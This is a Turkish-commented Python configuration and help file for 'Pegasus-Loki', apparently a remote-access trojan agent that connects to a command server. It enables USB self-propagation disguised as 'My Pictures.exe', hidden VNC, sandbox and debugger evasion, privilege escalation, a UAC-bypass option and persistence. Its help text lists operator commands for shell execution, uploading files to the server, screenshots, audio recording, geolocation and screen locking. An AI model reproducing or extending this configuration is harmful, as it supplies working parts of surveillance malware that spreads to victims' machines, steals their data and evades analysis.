# Pegasus-Loki Agent Konfigürasyonu
SERVER = "http://localhost:5000"
HELLO_INTERVAL = 2
IDLE_TIME = 60
MAX_FAILED_CONNECTIONS = 10
PERSIST = True

# Pegasus özellikleri
PEGASUS_FEATURES = {
    'encryption': True,
    'usb_spread': True,
    'hvnc': True,
    'security_checks': True,
    'anti_analysis': True,
    'privilege_escalation': True
}

# Güvenlik ayarları
SECURITY_SETTINGS = {
    'mutex_name': 'PegasusLokiMutex',
    'check_debugger': True,
    'check_sandbox': True,
    'sleep_evasion': True,
    'uac_bypass': False  # Dikkatli kullanın
}

# USB yayılma ayarları
USB_SETTINGS = {
    'enabled': False,  # Varsayılan olarak kapalı
    'spread_name': 'My Pictures.exe',
    'folder_name': 'My Pictures',
    'check_interval': 2.5
}

# HVNC ayarları
HVNC_SETTINGS = {
    'default_host': '127.0.0.1',
    'default_port': 5900,
    'auto_start': False
}

HELP = """
=== PEGASUS-LOKI AGENT KOMUTLARI ===

--- Temel Komutlar ---
<any shell command>     Komutu shell'de çalıştırır
help                    Bu yardım mesajını gösterir
exit                    Agent'ı kapatır

--- Dosya İşlemleri ---
upload <local_file>     Dosyayı sunucuya yükler
download <url> <dest>   HTTP(S) ile dosya indirir
zip <archive> <folder>  Klasörü zip arşivi yapar

--- Sistem Komutları ---
screenshot              Ekran görüntüsü alır
python <command|file>   Python komutu/dosyası çalıştırır
cd <directory>          Dizin değiştirir

--- Kalıcılık ---
persist                 Agent'ı sisteme kurar
clean                   Agent'ı sistemden kaldırır

--- Ses Kayıt ---
record <time> <channel> <chunk> <rate>
  Örnek: record 10 2 1024 44100
  -t: Süre (saniye)
  -c: Kanal sayısı
  -ch: Chunk boyutu
  -r: Örnekleme hızı

--- Pegasus Özellikleri ---
hvnc start [host] [port]    HVNC başlatır
hvnc stop                   HVNC durdurur
hvnc status                 HVNC durumunu gösterir

usb_status                  USB yayılma durumu
security_status             Güvenlik durumu

encrypt <data>              Veriyi şifreler
decrypt <encrypted_data>    Şifreyi çözer

geolocalisation            Konum bilgisi alır
lockscreen                 Ekranı kilitler (Windows)

--- Gelişmiş Özellikler ---
Pegasus-Loki agent aşağıdaki gelişmiş özellikleri destekler:
• AES-256 şifreleme
• USB otomatik yayılma
• Hidden VNC (HVNC)
• Anti-analiz koruması
• Mutex kontrolü
• Yetki yükseltme
• Sandbox tespit
• Debugger tespit

Daha fazla bilgi için: https://github.com/pegasus-loki
"""
